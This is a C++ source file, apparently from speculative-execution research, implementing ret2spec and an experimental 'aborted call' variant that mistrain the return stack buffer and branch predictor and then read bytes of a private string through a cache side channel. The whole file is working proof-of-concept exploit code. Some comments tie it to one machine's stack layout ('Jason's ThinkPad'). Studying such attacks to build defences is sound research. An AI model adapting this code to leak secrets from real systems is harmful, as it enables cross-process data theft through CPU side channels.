#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "ret2spec_common.h"
#include "utils.h"

// We cannot include the private_data twice, because that would lead to linking
// error. Declaring it extern in here.
extern const char *private_data;

// Calls sched_yield in the cross-address-space version.
void (*return_true_base_case)();
// Calls sched_yield in the cross-address-space version, in the
// same-address-space version starts the ReturnsFalse recursion.
void (*return_false_base_case)();

// Global variables used to avoid passing parameters through recursive function
// calls. Since we flush whole stack frames from the cache, it is important not
// to store on stack any data that might be affected by being flushed from
// cache.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

// Return value of ReturnsFalse that never changes. Avoiding compiler
// optimizations with it.
bool false_value = false;
// Pointers to stack marks in ReturnsTrue. Used for flushing the return address
// from the cache.
std::vector<char *> stack_mark_pointers;

// Always returns false.
bool ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
      // Unreachable code. ReturnsFalse can never return true.
      const std::array<BigByte, 256> &oracle = *oracle_ptr;
      ForceRead(oracle.data() +
                static_cast<unsigned char>(private_data[current_offset]));
      std::cout << "Dead code. Must not be printed." << std::endl;
      exit(EXIT_FAILURE);
    }
  } else {
    // Increase the interference if running cross-address-space.
    return_true_base_case();
  }
  return false_value;
}

// Always returns true.
static bool ReturnsTrue(int counter) {
  // Creates a stack mark and stores it to the global vector.
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);

  if (counter > 0) {
    // Recursively invokes itself.
    ReturnsTrue(counter - 1);
  } else {
    // In the deepest invocation starts the ReturnsFalse recursion or
    // unschedule to increase the interference.
    return_false_base_case();
  }

  // Cleans-up its stack mark and flushes from the cache everything between its
  // own stack mark and the next one. Somewhere there must be also the return
  // address.
  stack_mark_pointers.pop_back();
  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
  return true;
}

static int cond = 0;

void baz() {
  // This is copied here just to make sure speculation works.
  // For testing ret2spec, comment this out.  
  // const std::array<BigByte, 256> &oracle = *oracle_ptr;
  //   ForceRead(oracle.data() +
  //     static_cast<unsigned char>(private_data[current_offset]));

  // mfence and lfence, closing speculation window
  MemoryAndSpeculationBarrier();
  // This leads gcc to eliminate all code generation after baz.
  // while (true) {}
}

bool bar() {
  int stack_mark = 0xdeadbeef;
  char *ptr = (char *)&stack_mark;

  // Mistrain the global BP to predict taken.
  for (int i = 0; i < 100; i++) {}

  if (cond == 0) {
    // Return address is consistently at stack_mark + 20 bytes
    // on Jason's ThinkPad. Can't do FlushFromDataCache under
    // speculation since it doesn't fit in the window.
    FlushDataCacheLineNoBarrier(ptr + 20);

    // This is copied here just to make sure speculation works.
    // For testing ret2spec, comment this out.
    // const std::array<BigByte, 256> &oracle = *oracle_ptr;
    // ForceRead(oracle.data() +
    //   static_cast<unsigned char>(private_data[current_offset]));

    return true;
  }

  FlushDataCacheLine(ptr + 20);
  return false;
}

void foo() {
  // Make the condition false and induce misspeculation.
  // Bar should return false architecturally, but our goal is to
  // make it return true speculatively.
  cond = 1;
  
  // Flush the condition variable and serialize.
  // IMPORTANT: need to use the serialized function.
  FlushDataCacheLine(&cond);

  if (bar()) {
    // Call to baz will push address of ForceRead's instructions on
    // the RSB. Baz has a fence (or inf loop), causing speculation to fault.
    baz();

    // If RSB is not written under speculation, execution will not return
    // to the if-body at all. However, if it is, then even though the
    // pointer-into-RSB is restored, execution should jump here.
    const std::array<BigByte, 256> &oracle = *oracle_ptr;
    ForceRead(oracle.data() +
      static_cast<unsigned char>(private_data[current_offset]));
  }
}

char Ret2specLeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    ReturnsTrue(kRecursionDepth);
    stack_mark_pointers.pop_back();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

char Ret2AbortedCallLeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    // For branch predictor mistraining. Bar returns true.
    // 3 training runs suffice with the global BP trick in bar().
    cond = 0;
    for (int i = 0; i < 3; i++) {
      bar();
    }

    // Clear the cache channel.
    sidechannel.FlushOracle();

    // In our diagram, this is effectively the main function that calls foo
    // and probes the cache for an access.
    foo();

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}
